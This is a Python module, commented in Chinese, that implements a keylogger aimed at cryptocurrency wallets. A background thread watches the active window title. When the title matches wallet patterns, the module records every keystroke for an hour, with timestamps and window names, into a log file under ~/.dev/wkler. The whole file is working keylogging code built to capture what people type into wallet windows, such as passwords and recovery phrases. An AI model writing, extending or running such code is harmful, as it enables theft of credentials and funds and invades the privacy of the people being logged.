# -*- coding: utf-8 -*-
"""
键盘记录器核心模块 - 钱包扩展版本
"""

import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from pynput.keyboard import Key, KeyCode
from pynput import keyboard

from .detectors import get_active_window_name, should_trigger_recording, CHECK_INTERVAL

# 记录时长（秒）
RECORDING_DURATION = 60 * 60  # 60分钟


class KeyLogger:
    """钱包键盘记录器"""

    _KEY_NAMES = {
        Key.space: " ",
        Key.enter: "[Enter]",
        Key.tab: "[Tab]",
        Key.backspace: "[Backspace]",
        Key.delete: "[Delete]",
        Key.esc: "[Esc]",
        Key.up: "[Up]",
        Key.down: "[Down]",
        Key.left: "[Left]",
        Key.right: "[Right]",
        Key.shift: "[Shift]",
        Key.shift_l: "[Shift]",
        Key.shift_r: "[Shift]",
        Key.ctrl: "[Ctrl]",
        Key.ctrl_l: "[Ctrl]",
        Key.ctrl_r: "[Ctrl]",
        Key.alt: "[Alt]",
        Key.alt_l: "[Alt]",
        Key.alt_r: "[Alt]",
        Key.cmd: "[Cmd]",
        Key.caps_lock: "[CapsLock]",
        Key.home: "[Home]",
        Key.end: "[End]",
        Key.page_up: "[PageUp]",
        Key.page_down: "[PageDown]",
        Key.f1: "[F1]", Key.f2: "[F2]", Key.f3: "[F3]", Key.f4: "[F4]",
        Key.f5: "[F5]", Key.f6: "[F6]", Key.f7: "[F7]", Key.f8: "[F8]",
        Key.f9: "[F9]", Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
    }

    def __init__(self, log_file: Path, duration: int = RECORDING_DURATION, debug_mode: bool = False):
        self.log_file = log_file
        self.duration = duration
        self.debug_mode = debug_mode
        self.keyboard_listener = None
        self._log_handle = None

        # 记录状态
        self.is_recording = False
        self.recording_start_time = 0
        self.recording_timer = None
        self._lock = threading.Lock()

        # 窗口检测线程
        self._monitor_thread = None
        self._stop_monitor = threading.Event()

    def format_key(self, key) -> str:
        """格式化按键为可读字符串"""
        if isinstance(key, KeyCode):
            return key.char if key.char is not None else f"[{key.name}]"
        elif isinstance(key, Key):
            return self._KEY_NAMES.get(key, f"[{key.name}]")
        return str(key)

    def _open_log(self):
        """打开日志文件句柄"""
        if self._log_handle is None or self._log_handle.closed:
            self._log_handle = open(self.log_file, "a", encoding="utf-8")

    def _write_log(self, text: str):
        """写入日志并刷新"""
        try:
            self._open_log()
            self._log_handle.write(text)
            self._log_handle.flush()
        except Exception as e:
            print(f"写入日志失败: {e}", file=sys.stderr)

    def _close_log(self):
        """关闭日志文件句柄"""
        if self._log_handle and not self._log_handle.closed:
            self._log_handle.close()
            self._log_handle = None

    def on_press(self, key):
        """键盘按下事件"""
        if not self.debug_mode:
            with self._lock:
                if not self.is_recording:
                    return

        window_name = get_active_window_name() or "Unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = self.format_key(key)

        is_match = should_trigger_recording()
        status = "[触发]" if is_match else "[普通]"

        self._write_log(f"[{timestamp}] {status} [{window_name}] {key_str}\n")

        if self.debug_mode:
            print(f"\r{status} [{window_name}] {key_str}", end="", flush=True)

    def on_release(self, key):
        """键盘释放事件（用于退出）"""
        # F12 退出
        if key == Key.f12:
            print("\n检测到 F12，停止程序...")
            self._stop_monitor.set()
            self.stop_recording()
            return False

    def _monitor_windows(self):
        """后台线程：持续检测窗口变化"""
        last_window = None

        while not self._stop_monitor.is_set():
            try:
                window_name = get_active_window_name() or "Unknown"
                is_match = should_trigger_recording(window_name)

                if self.debug_mode and window_name != last_window:
                    last_window = window_name
                    status = ">>>" if is_match else "   "
                    print(f"\n{status} 窗口变化: [{window_name}]")

                if not self.debug_mode and is_match:
                    self.start_recording()
            except Exception:
                pass

            self._stop_monitor.wait(CHECK_INTERVAL)

    def start_recording(self):
        """开始记录"""
        with self._lock:
            if self.is_recording:
                return
            self.is_recording = True
            self.recording_start_time = time.time()

        window_name = get_active_window_name() or "Unknown"
        print(f"\n>>> 检测到钱包窗口: [{window_name}]")
        print(f">>> 开始记录，将持续 {self.duration // 60} 分钟")
        print(f">>> 日志将写入: {self.log_file}")

        timer = threading.Timer(self.duration, self.stop_recording)
        with self._lock:
            self.recording_timer = timer
        timer.start()

        self._write_log(f"\n# --- 记录开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        self._write_log(f"# 触发窗口: [{window_name}]\n")

    def stop_recording(self):
        """停止记录"""
        with self._lock:
            if not self.is_recording:
                return
            self.is_recording = False
            timer = self.recording_timer
            self.recording_timer = None

        if timer:
            timer.cancel()

        self._write_log(f"# --- 记录结束: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n\n")
        print(f"\n>>> 记录已停止 ({datetime.now().strftime('%H:%M:%S')})")
        print(">>> 继续监听...\n")

    def start(self):
        """启动监听"""
        print(f"钱包键盘记录器已启动")
        print(f"日志文件: {self.log_file}")
        print(f"平台: {self.platform_info()}")
        print(f"记录时长: {self.duration // 60} 分钟")
        print(f"模式: {'调试 (记录所有按键)' if self.debug_mode else '正常 (自动触发)'}\n")

        from .detectors import EXTENSION_PATTERNS
        print(f"监控关键词: {', '.join(EXTENSION_PATTERNS[:5])}...")
        print("工作原理: 持续检测活动窗口，匹配时自动记录\n")

        if self.debug_mode:
            print("调试模式已启用 - 实时显示窗口信息")
            print(f"当前窗口: [{get_active_window_name() or 'Unknown'}]")
            print(f"是否匹配: {should_trigger_recording()}\n")

        print("等待检测到钱包窗口...")
        print("按 F12 停止程序\n")

        # 启动窗口检测线程
        self._monitor_thread = threading.Thread(target=self._monitor_windows, daemon=True)
        self._monitor_thread.start()

        # 启动键盘监听
        self.keyboard_listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )

        self.keyboard_listener.start()

        try:
            self.keyboard_listener.join()
        except KeyboardInterrupt:
            print("\n\n已停止")
        finally:
            self._stop_monitor.set()
            self.stop_recording()
            self._close_log()

    @staticmethod
    def platform_info() -> str:
        """获取平台信息"""
        import platform
        return f"{platform.system()} {platform.release()}"


def create_log_file(log_dir: Path = None) -> Path:
    """
    创建日志文件

    Args:
        log_dir: 日志目录，默认为 %USERPROFILE%\.dev\wkler

    Returns:
        日志文件路径
    """
    if log_dir is None:
        log_dir = Path.home() / ".dev" / "wkler"

    log_dir.mkdir(parents=True, exist_ok=True)

    # 生成日志文件名（带日期）
    date_str = datetime.now().strftime("%Y%m%d")
    log_file = log_dir / f"recording_{date_str}.log"

    # 写入日志头部
    import platform
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"# 钱包键盘记录日志\n")
                f.write(f"# 创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# 平台: {platform.system()} {platform.release()}\n")
                f.write(f"# 日志格式: [时间] [状态] [窗口名称] 按键内容\n")
                f.write(f"# {'=' * 60}\n\n")
    except Exception as e:
        print(f"无法创建日志文件: {e}", file=sys.stderr)
        raise

    return log_file
